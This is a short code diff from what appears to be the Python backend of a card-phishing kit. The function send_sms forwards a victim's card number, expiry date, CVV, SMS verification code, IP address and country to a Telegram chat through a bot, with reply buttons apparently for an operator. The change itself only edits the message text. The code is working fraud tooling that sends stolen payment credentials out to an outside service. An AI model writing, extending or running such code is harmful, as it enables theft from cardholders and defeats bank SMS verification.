@@ -88,7 +88,7 @@ def send_sms(CHAT_ID, card, date, cvv, sms, ID, ip):
         ],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    bot.send_message(chat_id=CHAT_ID, text=escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐 : `{cvv}`\n💬 : `{sms}` \n\n👮🏿‍♂️ {ip}\n🗺 {get_country_by_ip(ip)} \n SMS'), reply_markup=reply_markup, parse_mode='MarkdownV2')
+    bot.send_message(chat_id=CHAT_ID, text=escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐 : `{cvv}`\n💬 : `{sms}` \n\n👮🏿‍♂️ {ip}\n🗺 {get_country_by_ip(ip)} \nSMS <3'), reply_markup=reply_markup, parse_mode='MarkdownV2')
 
 def ne_pizdabol(card, chat_id='-4150791967'):
     try:
